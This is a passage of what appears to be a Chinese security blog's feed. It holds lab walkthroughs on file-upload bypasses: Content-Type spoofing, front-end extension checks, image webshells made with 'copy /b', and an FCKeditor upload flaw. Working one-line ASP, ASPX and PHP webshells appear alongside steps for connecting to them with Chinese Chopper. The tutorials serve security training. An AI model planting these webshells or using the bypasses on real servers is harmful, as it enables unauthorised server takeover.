&lt;li&gt;熟悉南方数据企业网站管理系</summary>
      
    
    
    
    
    <category term="南方企业" scheme="https://0xchang.github.io/tags/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>中国菜刀配合一句话木马基本使用</title>
    <link href="https://0xchang.github.io/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://0xchang.github.io/2021/12/27/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2021-12-27T07:48:22.000Z</published>
    <updated>2022-02-11T11:59:49.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="中国菜刀配合一句话木马基本使用"><a href="#中国菜刀配合一句话木马基本使用" class="headerlink" title="中国菜刀配合一句话木马基本使用"></a>中国菜刀配合一句话木马基本使用</h2><p>目的：</p><ul><li>学习一句话木马</li><li>学习菜刀的使用</li></ul><p>原理：<br>菜刀的主要功能是用来连接一句话木马的，asp、aspx、php的一句话菜刀都可以连，只是这几种一句话语句不一样。</p><ul><li><p>asp的一句话是：<code>&lt;%eval request(“pass”)%&gt;</code></p></li><li><p>aspx的一句话是：<code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],”unsafe”);%&gt;</code></p></li><li><p>php的一句话是：<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p></li></ul><p>过程：</p><ul><li><p>打开火狐，<a href="http://192.168.1.3:8080/up%EF%BC%8C%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BF%9E%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC![image-20211228105130236](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)">http://192.168.1.3:8080/up，打开文件上传漏洞演示脚本，点击中国菜刀连接一句话木马![image-20211228105130236](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105130236.png)</a></p></li><li><p>点击浏览，上传php文件，木马地址为<a href="http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)">http://192.168.1.3:8080/up/images/lubr.php![image-20211228105156422](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105156422.png)</a></p></li><li><p>打开中国菜刀</p></li><li><p>添加木马地址，密码为lubr，脚本类型php(eval)<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105329855.png" alt="image-20211228105329855"></p></li><li><p>添加到主界面<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105353101.png" alt="image-20211228105353101"></p></li><li><p>右键文件管理，即可查看目标服务器的完整目录，也可进行创建文件，修改文件，修改和下载等相关操作<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105418680.png" alt="image-20211228105418680"></p></li><li><p>右键单击浏览网站，即可实现浏览器功能，浏览该站点<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%85%8D%E5%90%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20211228105439630.png" alt="image-20211228105439630"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;中国菜刀配合一句话木马基本使用&quot;&gt;&lt;a href=&quot;#中国菜刀配合一句话木马基本使用&quot; class=&quot;headerlink&quot; title=&quot;中国菜刀配合一句话木马基本使用&quot;&gt;&lt;/a&gt;中国菜刀配合一句话木马基本使用&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;学</summary>
      
    
    
    
    
    <category term="木马" scheme="https://0xchang.github.io/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="一句话" scheme="https://0xchang.github.io/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
    
  </entry>
  
  <entry>
    <title>图片木马绕过文件内容检测上传webshell</title>
    <link href="https://0xchang.github.io/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/"/>
    <id>https://0xchang.github.io/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</id>
    <published>2021-12-27T07:04:38.000Z</published>
    <updated>2022-02-11T11:59:50.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p><ul><li>理解绕过内容验证上传的原理</li><li>学习绕过内容验证上传的过程</li></ul><p>原理</p><ul><li>一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传</li><li>本实例就是将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接</li></ul><p>过程：</p><ul><li>打开火狐，进入网址<a href="http://192.168.1.3:8080/up%EF%BC%8C%E8%BF%9B%E5%85%A5%E6%9E%84%E9%80%A0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0webshell![image-20211228104158522](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)">http://192.168.1.3:8080/up，进入构造图片马绕过上传webshell![image-20211228104158522](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)</a></li><li>选择上传木马，后缀php改为php.jpg</li><li>点击上传，提示错误</li><li><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104300084.png" alt="image-20211228104300084"></li><li>制作图片马，将要上传的木马与图片一个文件下<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104350818.png" alt="image-20211228104350818"></li><li>打开cmd，进入对应目录<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104423625.png" alt="image-20211228104423625"></li><li>输入copy pic.jpg/b+lubr.php/a PicLubr.jpg，将lubr.php插入到pic.jpg中<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104518932.png" alt="image-20211228104518932"></li><li>在火狐上传PicLubr.jpg，后缀名改为PicLubr.jpg.php，然后上传<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104707308.png" alt="image-20211228104707308"></li><li>输入连接访问木马文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104737829.png" alt="image-20211228104737829"></li><li>打开中国菜刀，添加木马连接，输入密码lubr，脚本类型php(eval)</li><li>双击添加的shell，即可访问网站的完整目录<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104832489.png" alt="image-20211228104832489"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;图片木马绕过文件内容检测上传webshell&quot;&gt;&lt;a href=&quot;#图片木马绕过文件内容检测上传webshell&quot; class=&quot;headerlink&quot; title=&quot;图片木马绕过文件内容检测上传webshell&quot;&gt;&lt;/a&gt;图片木马绕过文件内容检测上传webshe</summary>
      
    
    
    
    
    <category term="webshell" scheme="https://0xchang.github.io/tags/webshell/"/>
    
    <category term="图片木马" scheme="https://0xchang.github.io/tags/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>绕过content_type检测文件类型上传webshell</title>
    <link href="https://0xchang.github.io/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/"/>
    <id>https://0xchang.github.io/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</id>
    <published>2021-12-27T06:15:40.000Z</published>
    <updated>2022-02-11T11:59:50.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p><ul><li>理解绕过Content-Type检测文件类型上传的原理</li><li>学习绕过Content-Type检测文件类型上传的过程</li></ul><p>原理:</p><ul><li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li><li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li></ul><p>过程：</p><ul><li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p></li><li><p>打开burp，点击intercept is off<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p></li><li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p></li><li><p>上传php文件，前台显示错误窗口<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p></li><li><p>Burp开启抓包</p></li><li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p></li><li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p></li><li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p></li><li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p></li><li><p>双击添加记录，可查看完整目录<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;绕过content-type检测文件类型上传webshell&quot;&gt;&lt;a href=&quot;#绕过content-type检测文件类型上传webshell&quot; class=&quot;headerlink&quot; title=&quot;绕过content_type检测文件类型上传webshell&quot;&gt;</summary>
      
    
    
    
    
    <category term="webshell" scheme="https://0xchang.github.io/tags/webshell/"/>
    
    <category term="content_type" scheme="https://0xchang.github.io/tags/content-type/"/>
    
  </entry>
  
  <entry>
    <title>绕过前台脚本检测扩展名上传webshell</title>
    <link href="https://0xchang.github.io/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/"/>
    <id>https://0xchang.github.io/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/</id>
    <published>2021-12-27T01:56:35.000Z</published>
    <updated>2022-02-11T11:59:50.542Z</updated>
    
    <content type="html"><![CDATA[<p>目的：</p><ul><li>理解绕过前台脚本检测扩展名上传的原理 </li><li>学习绕过前台脚本检测扩展名上传的过程 </li></ul><p>原理：</p><ul><li>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名</li><li>绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的</li></ul><p>过程：</p><ul><li>打开火狐，设置代理为127.0.0.1:8080 </li></ul><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/1.JPG"></p><ul><li>打开burp，点击proxy下的intercept，intercept is off，同样要在options标签设置代理，端口与浏览器设置一致 </li></ul><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/2.JPG"></p><ul><li><p>绕过验证</p><ul><li>在火狐输入地址<a href="http://ip:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BB%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0Webshell">http://ip:8080/up,进入文件上传漏洞演示脚本，点击绕过前台脚本检测扩展名上传Webshell</a></li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/3.JPG"></p><ul><li>点击浏览，上传木马，后缀为php，前台显示错误窗口</li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/4.JPG"></p><ul><li>打开burp打开抓包，将php后缀修改为jpg后重新上传文件<br><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/5.JPG"></li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/6.JPG"></p><ul><li>Burp抓到包后，将文件后缀修改为php</li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/7.JPG"></p><ul><li>点击forward，发送数据包，前台提示lubr.php上传成功</li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/8.JPG"></p></li><li><p>连接木马</p><ul><li>连接木马，在浏览器输入木马的完整地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA">http://192.168.1.3:8080/up/uploads/lubr.php，网页没有错误提示</a></li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/9.JPG"></p><ul><li>打开中国菜刀，添加木马地址，<a href="http://192.168.1.3:8080/up/uploads/lubr.php,%E5%AF%86%E7%A0%81lubr,%E9%80%89%E6%8B%A9%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%9E%8Bphp(eval)%EF%BC%8C%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0">http://192.168.1.3:8080/up/uploads/lubr.php,密码lubr,选择脚本类型php(eval)，点击添加</a></li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/10.JPG"></p><ul><li>双击添加记录，即可查看完整目录</li></ul><p>  <img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/11.JPG"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解绕过前台脚本检测扩展名上传的原理 &lt;/li&gt;
&lt;li&gt;学习绕过前台脚本检测扩展名上传的过程 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地</summary>
      
    
    
    
    
    <category term="-webshell -前端" scheme="https://0xchang.github.io/tags/webshell-%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Fckeditor漏洞上传webshell</title>
    <link href="https://0xchang.github.io/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/"/>
    <id>https://0xchang.github.io/2021/12/27/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/</id>
    <published>2021-12-27T00:45:33.000Z</published>
    <updated>2022-02-11T11:59:47.791Z</updated>
    
    <content type="html"><![CDATA[<p>目的：Fckeditor为在线网页编辑器。本实验演示<code>Fckeditor2.4.2</code>以下版本的一个编辑器上传漏洞。</p><p>原理：Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。</p><p>过程：</p><p>打开网站<code>http://ip:8001/fckeditor</code>,判断是否有fckeditor编辑器，出现403禁止访问，说明此目录存在<br><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/1.JPG"></p><p>判断fckeditor编辑器版本号，输入<code>http://ip:8001/FCKeditor/_whatsnew.html</code>,返回页面可知fckeditor版本为2.0</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/2.JPG"></p><p>此版本的fckeditor存在两个上传漏洞页面：<br><code>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</code><br><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=zhang&amp;CurrentFolder=/</code></p><p>第一个页面实在网站根目录下的<code>userfiles</code>目录下的<code>Image</code>目录下打开一个上传页面，上传的文件都保存在这个目录下，第二是在网站跟了目录下创建一个zhang目录</p><p><a href="http://ip:8001/FCKeditor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp">http://ip:8001/FCKeditor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</a></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/3.JPG"></p><p>先上传一个正常图片并查看返回结果，上传图片为1.jpg</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/4.JPG"></p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/5.JPG"></p><p>重新上传一个asp一句话，不允许上传</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/6.JPG"></p><p>尝试使用00截断的方法再次上传，打开burpsuite</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/7.JPG"></p><p>火狐浏览器设置代理，为127.0.0.1:8080</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Fckeditor%E6%BC%8F%E6%B4%9E%E4%B8%8A%E4%BC%A0webshell/8.JPG"></p><p>返回浏览器，重新上传文件，burp抓取到刷新的数据包，多次点击<code>forward</code>，直到浏览器显示页面</p><p><img 